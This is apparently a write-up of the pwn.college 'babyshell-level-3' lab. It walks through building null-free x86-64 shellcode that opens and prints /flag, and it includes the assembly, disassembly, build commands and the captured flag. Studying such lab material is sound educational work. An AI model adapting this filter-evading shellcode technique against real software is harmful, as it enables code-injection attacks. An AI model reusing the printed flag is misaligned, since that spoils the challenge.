# level3
## Description
Write and execute shellcode to read the flag, but your inputted data is filtered before execution.
## Solution
- The challenge file in `/challenge` is `babyshell-level-3`. Running it and giving it a sample input of `90` (the opcode of `nop`):
```
###
### Welcome to ./babyshell-level-3!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x1f970000!
Reading 0x1000 bytes from stdin.

90
Executing filter...

This challenge requires that your shellcode have no NULL bytes!

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x000000001f970000 | 39 30                                         | cmp dword ptr [rax], esi

Executing shellcode!

Segmentation fault
```
- We need to remove the null bytes from the shellcode. Disassembling the shellcode from [level1](./level1.md) using `objdump -d -M intel shellcode-elf`:
```

shellcode-elf:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <__bss_start-0x1000>:
  401000:       48 bb 2f 66 6c 61 67    movabs rbx,0x67616c662f
  401007:       00 00 00 
  40100a:       53                      push   rbx
  40100b:       48 c7 c0 02 00 00 00    mov    rax,0x2
  401012:       48 89 e7                mov    rdi,rsp
  401015:       48 c7 c6 00 00 00 00    mov    rsi,0x0
  40101c:       0f 05                   syscall
  40101e:       48 c7 c7 01 00 00 00    mov    rdi,0x1
  401025:       48 89 c6                mov    rsi,rax
  401028:       48 c7 c2 00 00 00 00    mov    rdx,0x0
  40102f:       49 c7 c2 e8 03 00 00    mov    r10,0x3e8
  401036:       48 c7 c0 28 00 00 00    mov    rax,0x28
  40103d:       0f 05                   syscall
  40103f:       48 c7 c0 3c 00 00 00    mov    rax,0x3c
  401046:       0f 05                   syscall
```
- We see a bunch of null bytes in the shellcode. We can remove them step by step:
  - Instead of the `mov rbx, 0x00000067616c662f` instruction, we can use `mov ebx, 0x67616c66; shl rbx, 8; mov bl, 0x2f`, as shown in the slides.
  - Instead of `mov rax, 2`, we can use `xor rax, rax; mov al, 2`. This is because `xor rax, rax` will set `rax` to 0, and `mov al, 2` will set the least significant byte of `rax` to 2 without null bytes.
  - Instead of `mov rsi, 0`, we can use `xor rsi, rsi`. This is because `xor rsi, rsi` will set `rsi` to 0 without null bytes.
  - Instead of `mov rdi, 1`, we can use `xor rdi, rdi; inc rdi`. This is because `xor rdi, rdi` will set `rdi` to 0, and `inc rdi` will increment `rdi` to 1 without null bytes.
  - Instead of `mov rdx, 0`, we can use `xor rdx, rdx`. This is because `xor rdx, rdx` will set `rdx` to 0 without null bytes.
  - Instead of `mov r10, 1000`, we can use `xor r10, r10; add r10, 100`. This is because `xor r10, r10` will set `r10` to 0, and `add r10, 100` will add 100 to `r10` without null bytes. I'm choosing to decrease the number of bytes to read to 100 because 1000 bytes is too big and can't be added in a single instruction without null bytes (as far as I know). Besides, 100 bytes is enough to read the flag.
  - Instead of `mov rax, 40`, we can use `xor rax, rax; mov al, 40`. This is because `xor rax, rax` will set `rax` to 0, and `mov al, 40` will set the least significant byte of `rax` to 40 without null bytes.
  - Instead of `mov rax, 60`, we can use `xor rax, rax; mov al, 60`. This is because `xor rax, rax` will set `rax` to 0, and `mov al, 60` will set the least significant byte of `rax` to 60 without null bytes.
- The final shellcode is:
```assembly
.intel_syntax noprefix
    mov ebx, 0x67616c66; shl rbx, 8; mov bl, 0x2f	# push "/flag" filename
    push rbx
    xor rax, rax				                    # syscall number of open
    mov al, 2
    mov rdi, rsp				                    # point the first argument at stack (where we have "/flag")
    xor rsi, rsi				                    # NULL out the second argument (meaning, O_RDONLY)
    syscall				                            # trigger open("/flag", NULL)
    xor rdi, rdi				                    # first argument to sendfile is the file descriptor to output to (stdout)
    inc rdi
    mov rsi, rax				                    # second argument is the file descriptor returned by open
    xor rdx, rdx				                    # third argument is the number of bytes to skip from the input file
    xor r10, r10                                    # fourth argument is the number of bytes to transfer to the output file
    add r10, 100
    xor rax, rax				                    # syscall number of sendfile
    mov al, 40
    syscall				                            # trigger sendfile(1, fd, 0, 100)
    xor rax, rax				                    # syscall number of exit
    mov al, 60
    syscall				                            # trigger exit()
```
- I compiled it using the following command: `gcc -nostdlib -static shellcode.s -o shellcode-elf`.
- Running `objdump -d -M intel shellcode-elf`:
```

shellcode-elf:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <__bss_start-0x1000>:
  401000:       bb 66 6c 61 67          mov    ebx,0x67616c66
  401005:       48 c1 e3 08             shl    rbx,0x8
  401009:       b3 2f                   mov    bl,0x2f
  40100b:       53                      push   rbx
  40100c:       48 31 c0                xor    rax,rax
  40100f:       b0 02                   mov    al,0x2
  401011:       48 89 e7                mov    rdi,rsp
  401014:       48 31 f6                xor    rsi,rsi
  401017:       0f 05                   syscall
  401019:       48 31 ff                xor    rdi,rdi
  40101c:       48 ff c7                inc    rdi
  40101f:       48 89 c6                mov    rsi,rax
  401022:       48 31 d2                xor    rdx,rdx
  401025:       4d 31 d2                xor    r10,r10
  401028:       49 83 c2 64             add    r10,0x64
  40102c:       48 31 c0                xor    rax,rax
  40102f:       b0 28                   mov    al,0x28
  401031:       0f 05                   syscall
  401033:       48 31 c0                xor    rax,rax
  401036:       b0 3c                   mov    al,0x3c
  401038:       0f 05                   syscall
```
- The shellcode doesn't contain any null bytes. I extracted the shellcode using the following command: `objcopy --dump-section .text=shellcode-raw shellcode-elf`.
- I sent the shellcode to the `stdin` of the challenge using the following command: `cat shellcode-raw /dev/stdin | /challenge/babyshell-level-3`. This gave me the flag:
```
###
### Welcome to /challenge/babyshell-level-3!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x1f970000!
Reading 0x1000 bytes from stdin.

Executing filter...

This challenge requires that your shellcode have no NULL bytes!

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x000000001f970000 | bb 66 6c 61 67                                | mov ebx, 0x67616c66
0x000000001f970005 | 48 c1 e3 08                                   | shl rbx, 8
0x000000001f970009 | b3 2f                                         | mov bl, 0x2f
0x000000001f97000b | 53                                            | push rbx
0x000000001f97000c | 48 31 c0                                      | xor rax, rax
0x000000001f97000f | b0 02                                         | mov al, 2
0x000000001f970011 | 48 89 e7                                      | mov rdi, rsp
0x000000001f970014 | 48 31 f6                                      | xor rsi, rsi
0x000000001f970017 | 0f 05                                         | syscall 
0x000000001f970019 | 48 31 ff                                      | xor rdi, rdi
0x000000001f97001c | 48 ff c7                                      | inc rdi
0x000000001f97001f | 48 89 c6                                      | mov rsi, rax
0x000000001f970022 | 48 31 d2                                      | xor rdx, rdx
0x000000001f970025 | 4d 31 d2                                      | xor r10, r10
0x000000001f970028 | 49 83 c2 64                                   | add r10, 0x64
0x000000001f97002c | 48 31 c0                                      | xor rax, rax
0x000000001f97002f | b0 28                                         | mov al, 0x28
0x000000001f970031 | 0f 05                                         | syscall 
0x000000001f970033 | 48 31 c0                                      | xor rax, rax
0x000000001f970036 | b0 3c                                         | mov al, 0x3c
0x000000001f970038 | 0f 05                                         | syscall 

Executing shellcode!

pwn.college{QWqg80YcXH-4VA7noBfsgKwj6Ze.0VOxIDL5QTO0czW}
```
- The flag is `pwn.college{QWqg80YcXH-4VA7noBfsgKwj6Ze.0VOxIDL5QTO0czW}`.